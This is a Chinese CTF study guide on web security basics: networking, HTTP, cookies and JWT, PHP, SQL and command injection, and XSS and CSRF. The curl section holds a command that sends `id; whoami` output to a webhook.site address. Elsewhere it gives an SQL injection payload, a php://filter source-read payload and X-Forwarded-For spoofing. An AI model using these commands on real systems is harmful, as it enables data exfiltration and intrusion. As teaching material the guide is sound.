### 第一部分 网络基础：一次访问到底经过了什么

#### 1. IP、域名、DNS 与 URL

- **域名**：给人看的好记名字，例如 `baidu.com`。
- **DNS（Domain Name System，域名系统）**：把域名翻译成对应的公网 IP 地址。例：查询 `www.baidu.com`，DNS 返回百度服务器 IP `110.242.68.66`这一串数字。
- **IP 地址**：网络设备的数字编号，是网络通信真正用来定位机器的地址，分**内网 IP（局域网内使用，如电脑、虚拟机地址）**和**公网 IP（互联网上唯一标识，百度服务器的 IP 就是公网 IP）**。
- **URL（统一资源定位符）**：完整网页地址，用来精准定位互联网上某一份资源，包含**协议 + 域名 + 路径 + 参数**。
	例：`https://www.baidu.com/s?wd=ctf`
	- `https`：协议
	- `www.baidu.com`：域名
	- `/s`：资源路径
	- `?wd=ctf`：查询参数（代表搜索关键词 ctf）

> 简单区分：域名只是名字；URL 是完整访问地址；DNS 负责把域名翻译成 IP。

#### 2. NAT 与出站/入站

**NAT（Network Address Translation，网络地址转换）**：路由器把内网设备的内网 IP，转换成路由器的公网 IP 去访问互联网。

核心特性：

1. **出站（egress）放行**：内网设备可以主动访问外网。
2. **入站（ingress）默认拦截**：外网机器无法主动连接内网电脑。

**VMware NAT 模式**就是虚拟机软件虚拟出来的 NAT：虚拟机可以访问外网，但外部不能主动访问虚拟机。

相关术语：

- **Egress**：出站流量，机器主动向外访问外网。
- **Ingress**：入站流量，外部网络主动访问内部机器。

> 总结下来就是：出站一般放行，入站通常被拦截。靶机主动向外发起连接，就能绕过防火墙和 NAT 的入站限制。这正是反弹 Shell、Webhook 数据外带和 SSRF 的底层原理。

#### 3. TCP 与 UDP

**TCP（Transmission Control Protocol，传输控制协议）**

- 特点：面向连接、可靠传输、全双工。
- 传输前需要三次握手建立连接；丢包会自动重传，保证数据完整有序。
- 比喻：打电话，拨号接通之后双向对话。
- 适用场景：网页、SSH、反弹 Shell，要求数据稳定。

**UDP（User Datagram Protocol，用户数据报协议）**

- 特点：无连接、不可靠。
- 不用握手，数据包直接发送，不确认对方是否收到。
- 比喻：寄明信片，投递后无法确认对方是否收到。
- 适用场景：DNS、游戏、视频直播，优先保证速度，少量丢包可以接受。

| 项目 | TCP | UDP |
| --- | --- | --- |
| 连接 | 需要建立连接（三次握手） | 无连接，直接发包 |
| 可靠性 | 可靠，丢包自动重传 | 不可靠，不重传 |
| 典型用途 | HTTP/HTTPS、SSH、nc 反弹 Shell | DNS、直播、游戏 |

> HTTP、Redis、MySQL、SSH 都基于 TCP。CTF 里的 gopher 协议可以自定义 TCP 原始数据包，用来打 SSRF 内网服务。

#### 4. HTTP 与 HTTPS

- **HTTP（HyperText Transfer Protocol，超文本传输协议）**：明文传输，数据相当于“裸奔”，中间人可以抓包查看内容，默认端口 80。
- **HTTPS**：HTTP + SSL/TLS 加密，传输数据被加密，抓包只能看到密文，默认端口 443。
- HTTP 协议的作用：规定浏览器与 Web 服务器之间请求、响应数据的统一通信规则。

#### 5. SSL/TLS 加密

- 是一套网络加密协议，专门用于给 HTTP 数据加密，把 HTTP 升级为 HTTPS。
- 通信前双方握手协商密钥，全程加密传输数据，防止数据被窃取、篡改。
- SSL 是老旧版本，目前全网通用 TLS 协议，日常统称为 SSL/TLS。

#### 6. VPS、VDS 与内网穿透

**VPS（Virtual Private Server，虚拟专用服务器）**

- 在物理服务器上虚拟化切分出来的独立虚拟服务器，自带独立公网 IP。
- 用途：在 VPS 上开启端口监听，接收靶机反弹 Shell；部署 frp 服务端 frps。

**VDS（Virtual Dedicated Server，虚拟独立服务器）**

- 硬件资源完全隔离独享，不会资源超售，性能稳定，价格高于 VPS。

**内网穿透工具**

1. **ngrok**：开箱即用，自带公共服务器，快速把本地端口暴露到公网，免费版有带宽限制。
2. **frp（Fast Reverse Proxy）**：分为 frps（VPS 服务端）和 frpc（本地客户端），稳定可控，需要一台 VPS。
3. **ssh -R**：SSH 自带的远程端口转发，无需额外安装软件，适合临时使用，稳定性较差。

> 内网穿透的本质：把本地或内网的端口暴露到公网，让外面的机器能够主动连进来，常用于接收反弹 Shell 和做回连验证。

### 第二部分 网页与浏览器：前端三大件

#### 1. HTML、CSS 与 JavaScript

- **HTML（超文本标记语言）**：网页的骨架结构，负责定义页面所有元素，例如文字、按钮、图片、输入框。
  - 它只是标记语言，无法执行逻辑代码，只做页面展示结构。
  - 后缀 `.html` 是静态文件，服务器直接原样返回给浏览器，不执行任何代码。
- **CSS（层叠样式表）**：网页的美化样式，负责控制颜色、字体、大小、布局、边距等外观效果，没有业务逻辑。
- **JavaScript（JS）**：网页交互脚本语言，运行在浏览器前端，实现点击弹窗、表单校验、页面动态变化、数据获取等交互效果。
  - CTF 关联：XSS 漏洞的本质，就是恶意 JS 代码在受害者浏览器中执行。

#### 2. 超文本（HyperText）

- 区别于普通纯文本，超文本可以嵌入链接、图片、视频等资源。
- 支持页面之间互相跳转，是 HTTP、HTML 的核心基础定义。

#### 3. 静态页面与动态页面

- **静态文件（例如 `index.html`）**：服务器不执行代码，直接把原文件返回给浏览器，浏览器本地完成渲染，所有用户看到的内容完全一致。
- **动态文件（例如 `index.php`）**：服务器先执行 PHP 代码，生成 HTML 内容，再把结果返回给浏览器渲染。不同用户、不同参数可以返回不同内容。
- **脚本**：无需编译，通过解释器直接运行的代码。常见脚本有 PHP、JS、Python、Bash。CTF 中的 RCE、Webshell 都基于脚本执行。

#### 4. DOM 与浏览器渲染

- **DOM（Document Object Model，文档对象模型）**：浏览器解析 HTML 之后，在内存里生成的树形结构对象。
- JS 可以操作 DOM 树，修改页面元素、文字、属性。
- HTML 源码是静态文本；DOM 是内存里动态生成的结构。

> 前端 JS 修改 DOM 后，查看网页源码看不到变化，需要打开“审查元素”查看实时 DOM。

简单渲染流程：

1. 下载 HTML。
2. 解析 HTML，构建 DOM 树。
3. 遇到 CSS，生成 CSSOM 树。
4. DOM + CSSOM 合成渲染树。
5. 布局（重排）、绘制（重绘），页面显示到屏幕上。

> JS 会阻塞 DOM 构建：遇到 JS 代码时，浏览器会暂停解析 DOM，优先执行 JS。

#### 5. 前端与后端的边界

- **前端**：运行在用户浏览器里，包含 HTML、CSS、JS。代码公开可见，负责页面展示、收集用户输入。
- **后端**：运行在服务器上，用户不可见，包含 PHP、Python、Java、数据库、服务器配置等。代码私密，负责处理逻辑、读写数据、执行命令、校验权限。
- 前后端关系：前端收集用户操作并展示结果；后端处理前端提交的数据，完成运算、查库、权限校验。
- 几乎所有 Web 漏洞（注入、SSRF、RCE）本质上都是后端逻辑漏洞。

### 第三部分 Web 服务器：请求交给谁处理

#### 1. Web 服务器的作用

常见 Web 服务器软件是 Nginx、Apache。

核心功能：监听 80/443 端口，接收浏览器的 HTTP 请求，响应网页资源。静态资源（HTML、图片）直接返回，动态 PHP 请求则转发给 PHP-FPM 处理。

#### 2. Nginx 与 Apache 的区别

- **Nginx**：高并发、占用内存小、速度快，是目前主流网站和 CTF 靶机的首选，擅长反向代理、负载均衡。
- **Apache**：老牌服务器，兼容性强，动态脚本适配好，但并发性能较弱、资源占用较高。

#### 3. CGI 与 PHP-FPM

- **CGI**：通用网关接口，规定 Web 服务器如何把请求交给后端脚本程序处理。老旧方案，性能差，已基本淘汰。
- **PHP-FPM**：PHP 专用进程管理器，常驻内存待命，可以快速处理 PHP 请求。

工作流程：

```text
Nginx/Apache 接收 PHP 请求
        ↓
转发给 PHP-FPM 执行代码
        ↓
返回执行结果给 Web 服务器
        ↓
Web 服务器返回给浏览器
```

#### 4. 服务器配置文件

- `.conf` / `.cnf`：都是配置文件后缀，纯文本格式，用于保存软件运行参数。
  - `.conf`：Nginx、Apache 主流使用。
  - `.cnf`：MySQL 主流使用。
  - 修改后通常需要重启服务才能生效。
- `apache2.conf`：Apache 全局主配置文件，`2` 代表 Apache 2.x 版本，控制整个服务器的全局规则、权限、模块。修改后必须重启 Apache。
- `.htaccess`：Apache 专属的目录级配置文件，无需重启服务，仅对当前文件夹及子文件夹生效。
  - CTF 核心用途：设置路由规则、文件解析规则、页面重定向、漏洞利用。

#### 5. 重定向

- 服务器告知浏览器资源地址发生了变化，浏览器自动跳转到新 URL。
- 分为 301 永久重定向和 302 临时重定向。
- 可用于页面跳转、漏洞绕过、URL 伪装。

#### 6. 网站根目录与持久化目录

**网站根目录**

- Web 服务器对外暴露的文件夹，浏览器访问网站时，服务器会从这个目录寻找网页文件。
- 常见默认路径：Apache 是 `/var/www/html`，Nginx 常见 `/usr/share/nginx/html`。
- 只有根目录内的文件才能通过 HTTP 访问，根目录以外的文件正常情况下无法直接访问。

**持久化目录**

- 数据写入后，重启服务器、重启程序，数据依然保留的目录，数据保存在磁盘。
- 内存里的数据重启会丢失，持久化目录的数据保存在硬盘。
- 持久化目录不会自动变成网站根目录，需要手动修改 Web 服务配置，把它设置为网站根目录后才能通过网页访问。

两者区别：

1. **网站根目录**是访问权限概念，控制哪些文件能通过 Web 请求读取或上传。
2. **持久化目录**是数据存储特性概念，代表数据断电不消失。
3. 两者可以是同一个文件夹，也可以互相独立。

#### 7. 反向代理、路由、负载均衡与访问控制

- **反向代理**：部署在业务服务器前端。用户访问代理服务器，由代理代替用户向后端真实服务器请求资源，再把结果返回用户。用户无法获知后端真实 IP，常用软件是 Nginx。
- **路由**：根据访问的 URL 路径分发请求。例如 `/admin` 转发到后台页面，`/api` 交给接口程序。
- **负载均衡**：多台相同后端服务器组成集群，反向代理把用户请求分发到不同机器，分摊压力，防止单台服务器过载。常用轮询策略。
- **访问控制**：用规则限制资源访问权限，例如仅内网 IP 可访问后台、登录后才能访问页面、IP 黑名单拦截。
  - 可以伪造 `X-Forwarded-For` 请求头绕过 IP 限制。

### 第四部分 HTTP 请求体系：

#### 1. 什么是请求

客户端（浏览器或工具）向服务器发送一段规范数据包，索要资源、提交数据，这个行为就叫“请求”。

#### 2. 请求结构的四要素

1. **路径 path**：服务器资源位置，例如 `/index.php`。
2. **GET 参数**：URL 中 `?` 后面的数据，属于链接的一部分。
3. **请求头 header**：附加信息。
4. **请求体 body**：POST、上传、JSON 数据存放的位置。

#### 3. GET 与 POST

**GET 参数**

- 放在 URL 问号后：`?id=1&name=admin`。
- 公开可见、长度有限。
- CTF 核心漏洞点：GET 注入、XSS、越权。

**POST 数据**

- 放在请求体中，不在 URL 显示。
- 容量大，适合传密码、表单、大量数据。
- 文件上传、`php://input` 读取都依赖 POST。

**文件上传**

- 属于 POST 的特殊模式。
- 需要特定编码格式 `multipart/form-data`。
- CTF 高频漏洞：通过文件上传漏洞传 Webshell。

#### 4. HTTP 请求方法

- **GET**：获取页面资源，参数放在 URL 问号后面。
- **POST**：提交数据，数据放在请求体，常用于表单提交、漏洞注入。
- **PUT**：上传或覆盖文件，WebDAV 漏洞考点，可上传 Webshell。
- **DELETE**：删除服务器文件。
- **HAHA**：CTF 题目自定义的请求方法，后端代码会判断请求方法做权限校验。

#### 5. 常见请求头

- **Content-Type**：告诉服务器本次请求体是什么格式。常见三种：
  1. `application/x-www-form-urlencoded`：普通表单。
  2. `multipart/form-data`：文件上传专用。
  3. `application/json`：接口 JSON 数据。
- **User-Agent（UA）**：客户端浏览器标识。服务端用来识别客户端，CTF 中可伪造 UA 绕过过滤。
- **Referer**：记录你从哪个页面跳转过来。网站防盗链常用，也可伪造绕过防盗链、白名单检测。
- **X-Forwarded-For（XFF）**：反向代理专用头，代表真实用户 IP。服务器信任此头时，可以伪造内网 IP `127.0.0.1` 绕过后台 IP 限制。

> curl 伪造请求头示例：
>
> ```bash
> curl -v 'http://xxx' -A 'HAHA Browser' -H 'Referer: http://xxx' -H 'X-Forwarded-For: 127.0.0.1'
> ```

#### 6. 请求体编码格式

- POST 数据必须声明格式，否则服务器无法解析。
- `multipart/form-data` 会把数据拆成多个数据块传输，是唯一支持二进制和文件上传的格式。

#### 7. JSON 数据格式

- 轻量级结构化数据格式，用于接口传输数据。
- 特征：键值对、大括号包裹、纯文本、程序极易解析。

```json
{"user":"admin","id":1}
```

- CTF 场景：接口注入、JSON 越权、JWT 解析。

#### 8. XML 数据格式

- 可扩展标记语言，用于传输、存储结构化数据，形式上类似 HTML。
- CTF 漏洞：XXE（XML 外部实体注入），可以读取服务器本地文件、探测内网。

#### 9. 用 curl 构造和观察请求

curl 是命令行 HTTP 客户端，用来发送 HTTP 请求，CTF 中用于发包、测试漏洞、外带数据。

常用参数：

- `-s`：silent 静默模式，关闭进度条，只返回页面内容。外带场景常用，避免进度条混入回传数据。
- `-H`：添加自定义 HTTP 请求头，可以伪造 UA、XFF、Cookie 等。
- `-X`：指定 HTTP 请求方法，例如 GET、POST、PUT，甚至自定义方法。
- `-d` / `--data`：提交 POST 请求体数据，例如 `code=payload`。
- `--data-binary`：原样传输 POST 数据，不自动处理换行、转义，适合二进制或复杂 payload。

常用示例：

```bash
# 携带自定义 UA、Referer、XFF 头
curl -v 'http://xxx' -A 'HAHA Browser' -H 'Referer: http://xxx' -H 'X-Forwarded-For: 127.0.0.1'

# 盲执行外带，把命令执行结果传给 webhook
curl -s "https://webhook.site/UUID" --data-binary "$(id; whoami) 2>&1"
```

> `-X` 的全称是 `--request`。使用 `-d` 传参数时 curl 会自动切换为 POST，此时 `-X POST` 可以省略。

#### 10. 抓包原理

- 抓包就是拦截、查看、修改浏览器与服务器之间的 HTTP 数据包。
- 能做什么：
  - 修改 GET/POST 数据，制造注入。
  - 修改请求头，绕过限制。
  - 伪造身份、伪造 IP。
  - 查看隐藏参数、隐藏路径。
- 常用工具：Burp Suite、Fiddler。

#### 11. 日志记录

- 服务器自动记录访问 IP、访问路径、请求参数、报错信息、时间等。
- CTF 用途：从日志泄露中寻找源码路径、泄露的 payload、后台地址。

### 第五部分 数据形态：编码、哈希与正则

#### 1. 编码与解码

- **Encode（编码）**：把原始内容转换成另一种格式，方便传输和存储。原始内容 → 编码后内容。
- **Decode（解码）**：把编码后的内容还原成原始文本。编码后内容 → 原始内容。
- 常见编码：URL 编码、Base64、Hex、Unicode。

CTF 场景：

1. 后端接收编码后的 payload，先解码再执行。
2. 经常使用双重编码、多次编码来绕过 WAF 过滤。

#### 2. MD5 哈希

- MD5 是消息摘要算法（哈希算法），输入任意长度的文本，输出固定 128 bit 的十六进制字符串。
- 特点：单向哈希，不能反向解密得到原文。
- 缺陷：存在碰撞漏洞，可以构造两个不同原文，得到完全相同的 MD5 值，这是 CTF 经典考点“MD5 碰撞”。
- 用途：密码存储、文件完整性校验。

#### 3. 正则表达式

- 正则表达式用于匹配、筛选文本，Web CTF 中大量用于 WAF 过滤和后端输入限制。
- 基础符号：
  - `^`：匹配字符串开头。
  - `$`：匹配字符串结尾。
  - `.`：匹配任意单个字符，默认不匹配换行。
  - `*`：匹配前面的内容 0 次或多次。
- 后端常用正则对用户输入做过滤，拦截危险 payload；做题时就要想办法 bypass 这个限制。
- 常见用途：表单校验、过滤命令注入、过滤 SQL 注入 payload。

### 第六部分 Linux、命令行与靶场环境

#### 1. 常用基础命令

- `cat`：concatenate，输出文件全部内容，适合直接读取小文件的完整内容。
- `grep`：Global Regular Expression Print，文本过滤搜索，只输出匹配关键词的行，常搭配管道 `|` 使用。

```bash
cat index.php | grep "password"
```

#### 2. Linux 文件权限

`ls -l` 的输出中，权限字符串格式类似 `-rw-rw-r--`。

- 第 1 位是文件类型：
  - `-`：普通文件。
  - `d`：目录文件夹。
  - `l`：软链接。
- 后面 9 位分成 3 组：属主权限 | 属组权限 | 其他用户权限。
  - `r` = read，可读。
  - `w` = write，可写。
  - `x` = execute，可执行。
  - `-` 代表无此权限。

- **属主（owner）**：文件的拥有者，单个用户，拥有第一套权限。
- **属组（group）**：一组用户的集合，组内所有成员共用第二套权限。

示例：

```text
-rw-r--r-- www-data www-data flag.php
```

属主 `www-data` 可读可写；同组用户和其他用户仅可读。

#### 3. CTF 常见系统文件

- `/etc/passwd`：存储用户账号基本信息，不存密码哈希，普通用户可读，可以拿到系统所有用户名。
- `/etc/shadow`：存储用户密码哈希，权限严格，仅 root 可读，拿到后可用 John、Hashcat 爆破密码。
- `/etc/apache2/apache2.conf`：Apache2 主配置文件，控制全局 Web 服务设置，后缀数字 2 代表 Apache 2 版本。

#### 4. Windows 系统相关命令

- **CMD**：Windows 自带的旧命令行终端，命令功能有限。
- **PowerShell**：Windows 新一代终端，功能更强，支持复杂管道、网络请求。
- CTF 内网渗透时，Windows 靶机经常使用 PowerShell 执行 payload、下载文件。

#### 5. Docker 靶场

- Docker 是容器技术，可以快速一键拉起漏洞靶场（例如 vulhub）。
- 容器是轻量级虚拟环境，快速部署漏洞环境，用完一键销毁。
- 与 VMware 虚拟机的区别：虚拟机是完整操作系统，体积大；Docker 容器共享宿主机内核，启动快、体积小。

### 第七部分 身份认证：Cookie、Session 与 Token

#### 1. 明文、哈希与登录验证

- **明文**：未加密、未处理、肉眼可直接读懂的原始文本。例如密码 `admin123` 直接写在文件里就是明文。网络安全原则：密码绝对不能明文存储。
- **哈希（Hash）**：单向加密算法。明文可以算出哈希，哈希无法反向算出明文；相同明文、相同算法，永远得到相同哈希值。
- 服务器只存哈希，不存明文密码，以此保证密码安全。

密码哈希验证流程：

1. 用户输入明文密码。
2. 系统用相同的哈希算法计算输入密码的哈希。
3. 与系统保存的哈希进行对比。
4. 一致则登录成功，不一致则拒绝登录。

#### 2. `/etc/shadow` 与哈希爆破

- Linux 系统专门存放用户密码哈希的系统文件，不存明文，只存哈希字符串。
- 权限极高，普通用户无法读取。
- CTF 用途：拿到 shadow 文件后可以爆破密码。

常见哈希爆破工具：

- **John**：老牌哈希爆破工具，简单易用。
- **Hashcat**：GPU 加速，爆破速度极快，是 CTF 主流工具。
- 原理：字典逐个尝试，计算哈希并比对，匹配成功就得到明文密码。

#### 3. Cookie

- 浏览器自带的本地存储机制，是一块自动保存数据的空间。
- 由服务器下发，浏览器自动保存。
- 下次访问同一网站时，浏览器会自动携带 Cookie。
- 用于维持用户登录状态、记录身份。
- Cookie 是“容器”，本身不是身份凭证。

#### 4. SessionID 会话机制

- 服务器端会话认证机制，是传统网站默认的登录方式。

登录流程：

1. 用户登录成功。
2. 服务器生成唯一 SessionID，在服务器内存或数据库中保存你的登录信息。
3. 服务器下发指令，让浏览器把 SessionID 存入 Cookie。
4. 后续所有请求，浏览器自动带上 Cookie，也就是携带 SessionID。
5. 服务器通过 SessionID 查询你的会话，识别你是谁。

区别：

- Session 数据存在服务器。
- SessionID 存在浏览器的 Cookie 里。
- 可以这样理解：Cookie 是盒子，SessionID 是卡号，Session 数据是你的个人信息。

#### 5. Token 鉴权机制

- 新式身份认证方式，无需服务器保存会话。

原理：

1. 登录成功后，服务器生成一段带签名的凭证字符串（Token）。
2. Token 自带用户信息。
3. 客户端保存 Token，可以放在 Cookie 或请求头里。
4. 每次请求都带上 Token。
5. 服务器只校验签名，不用查数据库。

优缺点：

- 优点：减轻服务器压力，适合分布式、多服务器集群。
- 缺点：一旦签发，在过期前无法主动销毁。

#### 6. JWT（最常用的 Token 格式）

**JWT 全称：JSON Web Token**，是目前互联网最主流的 Token 标准，经常放在 Cookie、URL 参数、Authorization 请求头中，用来做登录鉴权。

三段结构：

```text
header.payload.signature
```

1. **Header 头部**：算法（例如 RS256 / HS256）和类型，使用 Base64 编码。
2. **Payload 载荷**：存放用户信息，例如 `role`、`user`、`exp` 过期时间。它可以被解码查看，并不是加密。
3. **Signature 签名**：校验令牌有没有被篡改，是防篡改的核心。

**RS256（RSA 非对称算法）**

- 用私钥签名，用公钥验签，公钥可以公开。
- 经典考点：算法混淆攻击。把算法从 `RS256` 改成 `HS256`，拿公开的 RSA 公钥文本当作 HS256 的密钥，伪造管理员 Token。

**HS256（HMAC 对称算法）**

- 同一个密钥既用于签名，也用于验签，密钥不能泄露。
- 特点是加密和解密共用同一个密钥。

Payload 中的关键字段：

- `exp`：expiration，过期时间，时间戳，超过这个时间 Token 失效（401）。
- `nbf`：not before，在此时间之前 Token 不可用。
- `role`：角色权限，例如 guest / admin，是做题重点。

JWT 在 CTF 中的作用：

- Payload 可以直接解码查看信息。
- 弱密钥可以伪造 JWT，直接冒充管理员。

#### 7. Cookie、SessionID、Token 的关系

1. **Cookie**：存储工具、容器，是浏览器功能。
2. **SessionID**：传统登录凭证，编号存在 Cookie，数据存在服务端。
3. **Token / JWT**：新式登录凭证，自带数据，依靠签名校验。

再压缩成一句话：

- Session：服务端存数据，客户端存编号。
- JWT Token：客户端存全部信息 + 签名，服务端不存数据。
- Cookie：用来装 SessionID 或 Token 的浏览器容器。

### 第八部分 数据库与接口

#### 1. 数据库的作用

数据库是有组织存放数据的软件，用于快速实现数据的增加、删除、查询、修改。网站账号、文章、业务数据都保存在数据库中。

#### 2. MySQL（磁盘型数据库）

- 数据主要存储在硬盘上。
- 优点：持久保存数据，关机不会丢失。
- 缺点：读写速度相对内存数据库慢。
- CTF 考点：SQL 注入，读取、修改库内数据。

#### 3. Redis（内存型键值数据库）

- 核心：运行时数据优先放在服务器内存（RAM）中。
- 特点：读写速度极快；断电会丢失内存数据，但支持 RDB/AOF 机制定期备份到硬盘做持久化。
- 常用场景：缓存、临时会话、计数器。
- CTF 考点：SSRF 攻击 Redis，写入 Webshell、写定时任务获取服务器权限。

#### 4. 接口 API

- API 是后端提供的数据接口程序，不渲染网页页面，只返回结构化数据（一般为 JSON），供前端或其他程序调用。
- 示例：访问 `/api/getuser?id=1`，后端返回 `{"name":"test","id":1}`，只有数据，没有页面 UI。
- AI 付费 API（豆包、DeepSeek）也属于 API。客户端发送文本请求，服务商后端调用大模型运算，返回 AI 回答。调用时携带 Token 鉴权，服务商统计 Token 用量计费。

### 第九部分 做题方法论与信息收集

#### 1. 黑盒、白盒与灰盒

- **黑盒测试**：看不到源码，只通过页面的输入输出猜测后端逻辑、寻找漏洞。线上赛大部分是黑盒。
- **白盒测试**：拿到完整源代码，直接审计代码寻找漏洞（代码审计），可以直接看懂过滤逻辑和漏洞位置。
- **灰盒**：介于两者之间，有部分源码或部分信息。

#### 2. 信息收集（Web 做题第一步）

1. 查看页面源码、审查 DOM。
2. 看响应头 `Server` 字段，判断后端服务版本（Nginx / Apache 版本）。
3. 寻找泄露文件：`.git`、`.svn`、备份文件 `.bak`。
4. 抓包，查看 Cookie、JWT、请求参数。
5. 目录扫描（fuzz 目录）。

#### 3. Fuzz（模糊测试）

- 自动化批量发送大量 payload，试探后端，探测目录、参数、漏洞。
- 原理：字典 + 自动化请求，尝试大量路径、参数。
- 用途：爆破隐藏目录、测试 WAF 过滤、寻找可用参数。

#### 4. 寻找路径与使用 Payload

寻找路径的方法：

- 使用目录扫描工具 dirsearch、dirb 扫描后台路径。
- 从源码泄露、`robots.txt`、页面注释、报错信息、日志中发现路径。
- 常见猜测路径：`/admin`、`/backup`、`/.git`。

使用 Payload：

- 找到可控输入点（GET 参数、POST 表单），填入 payload 发送请求触发漏洞。

#### 5. Git 与 `.git` 源码泄露

- Git 是分布式版本控制工具，用于管理代码，记录每一次修改，支持回退旧版本、多人协同开发。
- 分布式版本控制意味着：每一台本地电脑都会保存完整代码仓库和全部历史记录，不依赖单一中心服务器，可以离线提交代码，联网后再同步版本。
- 对比集中式 SVN：只有中央服务器保存完整代码，本地只有当前代码，断网无法提交。
- CTF 考点：网站目录暴露 `.git` 文件夹，攻击者可以下载完整源码，寻找漏洞。

常见工具：

- **GitHacker**：Python 开发，专门爬取泄露的 `.git` 目录，还原源码文件。上手简单，CTF 使用广泛。
- **dvcs-ripper**：DVCS 版本控制仓库抓取工具，支持 Git、SVN 等版本控制系统。

对比：

- GitHacker 主打 `.git`，更轻量，是 CTF 首选。
- dvcs-ripper 支持更多版本控制系统（例如 SVN），功能更广，但安装依赖更多。

#### 6. 开发工具链常识

**包管理器**：自动下载、安装、升级、卸载别人写好的代码库（依赖库）的工具，无需手动下载源码。

- Node：npm / yarn / pnpm
- Python：pip
- PHP：composer

**项目依赖库**：第三方已经编写完成的代码库，项目直接引入使用，不用从零开发。项目会在 `package.json` 中记录依赖清单。

**npm / yarn / pnpm**

- npm：Node 自带，老牌工具，旧版本安装慢、占用磁盘大。
- yarn：早期为了修复 npm 缺陷而开发，现在使用量下降。
- pnpm：新一代工具，安装速度最快，磁盘占用最小，采用硬链接复用包。
- 三者功能基本一致，命令略有差异。

**Bash、Node.js、node**

- Bash：Linux 默认终端 shell（命令解释器），终端输入的命令交给 Bash 执行。CTF 中 RCE 经常执行 Bash 命令。
- Node.js：服务端 JS 运行环境，可以用 JS 编写后端程序。
- node：终端调用 Node.js 的命令。

#### 7. CTF 基础攻击名词

- **Payload**：攻击载荷，指触发漏洞的攻击语句、代码。例如 SQL 注入的 `1' or '1'='1-- -` 就是 payload。
- **Webshell**：上传到服务器的一句话后门脚本，拿到 Webshell 后即可在服务器执行系统命令、控制网站。常见 `shell.php`。
- **RCE（远程代码执行）**：远程控制服务器执行系统命令，属于高危漏洞。

### 第十部分 PHP 基础：看懂服务端代码

#### 1. 常用输出与执行函数

**print_r()**

- 作用：打印变量的结构与内容，数组、对象都可以输出。
- `print_r($var, true)`：第二个参数为 true 时，不直接打印，而是把输出内容返回成字符串，存入变量。
- 区分：`echo` 只能输出简单字符串；`var_dump` 输出类型 + 长度；`print_r` 只输出值。

**shell_exec()**

- 执行系统命令，只返回命令执行输出，不会直接输出到页面。
- 盲执行经典场景：`shell_exec($_POST['code'])`，命令执行了，但页面不返回执行结果。

**ob_start() / ob_get_clean()**

- `ob_start()`：开启输出缓冲区，接住所有页面打印输出，不会直接输出到网页。
- `ob_get_clean()`：取出缓冲区全部内容，存入变量，同时清空缓冲区。
- PHP 盲执行代码常用这一组函数捕获命令输出；如果代码里没有 echo 输出捕获的结果，就会造成盲执行。

**htmlspecialchars()**

- 转义 HTML 特殊字符（`< > & " '`），防止 XSS，把特殊符号变成实体编码。
- 作用：用户输入的内容直接放到页面上时，转义后可以防止 JS 执行。

#### 2. PHP 比较符号

- `=`：赋值符号，把右边的值赋给左边变量，不是判断相等。
- `==`：弱类型相等，自动转换两边数据类型再比较，CTF 中大量弱类型绕过考点。
- `===`：严格全等，类型 + 值必须完全一模一样才返回 true。判断请求方法 `$_SERVER['REQUEST_METHOD'] === 'POST'` 用的就是它。

#### 3. `$_SERVER` 超全局变量

- `$_SERVER['REQUEST_METHOD']`：获取当前 HTTP 请求的方法（GET / POST）。
- `$_POST['xxx']`：获取 POST 请求体中的参数。
- `$_GET['xxx']`：获取 URL 问号后的 GET 参数。

#### 4. PHP CLI 模式

- PHP 命令行模式，在服务器终端直接执行 PHP 代码，不依赖 Web 服务器，也不经过浏览器。
- 命令示例：

```bash
php -r "echo system('id');"
```

- 区分：网页模式（CGI/FPM）是接收 HTTP 请求执行 PHP；CLI 是终端直接运行。

#### 5. PHP 伪协议

CTF 文件包含最常用：

- `php://input`：读取 POST 请求体中的数据。
- `php://filter`：读取文件并编码输出，常用来读取源码。

示例 payload：

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
```

#### 6. 危险函数

触发 RCE 的 PHP 函数。如果用户可控参数传入这类函数，就会产生命令注入漏洞：

- `system()`
- `exec()`
- `shell_exec()`
- `passthru()`

### 第十一部分 注入漏洞：输入被当成了代码

#### 1. 注入的核心原理

程序原本只把用户输入当作普通字符串；攻击者构造特殊输入，破坏原有语句结构，让后端把输入当作代码或命令执行，这类漏洞统称为注入。

核心条件：外部可控输入，没有做过滤或转义，直接拼入后端语句，输入被解释成代码执行。

#### 2. SQL 注入

- 用户可控输入直接拼接进 SQL 语句，篡改 SQL 逻辑，查询或修改数据库数据。
- GET 参数注入：GET 参数 `?id=xxx` 可控，参数直接拼入 SQL，传入 payload 触发注入。
- 示例 payload：

```text
1' or '1'='1-- -
```

#### 3. 命令注入

- 用户输入被拼进系统 Shell 命令，直接执行操作系统指令。
- 属于高危漏洞，可以直接拿到服务器权限。
- PHP 中常见触发点就是 `system()`、`exec()`、`shell_exec()`、`passthru()` 等危险函数。

#### 4. XXE（XML 外部实体注入）

- 后端解析 XML 时开启了外部实体，攻击者构造恶意 XML，读取服务器本地文件、探测内网。

#### 5. 三大注入对比

| 漏洞类型 | 输入被拼进哪里 | 执行结果 |
| --- | --- | --- |
| SQL 注入 | SQL 查询语句 | 读写数据库数据 |
| 命令注入 | 系统 Shell 命令 | 执行操作系统指令，可能拿下服务器 |
| XXE | XML 解析器 | 读取本地文件、探测内网 |

> 一句话记忆：输入没被过滤掉，当成代码跑了，就是注入。PS：拿过滤网过滤茶叶，发现过滤网破了。

### 第十二部分 XSS 与 CSRF：攻击浏览器和使用者

#### 1. XSS 的定义

- **XSS（Cross Site Scripting，跨站脚本）**：攻击者注入 JS 代码，页面没有做过滤，代码在受害者浏览器中执行。
- **XSS 和 JS 的关系与区别**：JS 是编程语言；XSS 是漏洞攻击方式，利用 JS 实现攻击效果。JS 本身无害；如果网站没有过滤用户输入，恶意 JS 被页面渲染执行，就形成了 XSS。

#### 2. XSS 的三类

1. **存储型 XSS**：攻击代码存入数据库，所有人访问页面都会触发，危害最大，适合挂恶意脚本、批量偷 Cookie。
2. **反射型 XSS**：需要诱骗用户携带 payload 访问链接，一次性触发。payload 放在 URL 参数中，不存入服务器。
3. **DOM 型 XSS**：纯前端 JS 漏洞，数据不经过后端存储，只靠前端 JS 解析用户输入。

限制：XSS 只能作用于访问页面的用户浏览器，不能直接拿下服务器权限。

#### 3. XSS 的攻击效果

- 盗取 Cookie。
- 劫持前端页面。
- 诱导用户操作。

#### 4. CSRF（跨站请求伪造）

- 定义：诱导已登录用户在不知情的情况下，发起非自愿请求。
- 原理：用户登录 A 网站，Cookie 保存在浏览器；访问恶意页面时，恶意页面自动发起请求访问 A 网站。浏览器自动带上 Cookie，服务器就认为是用户本人操作。
- 特点：攻击者无法获取 Cookie 内容，而是利用浏览器自动携带 Cookie 的特性。
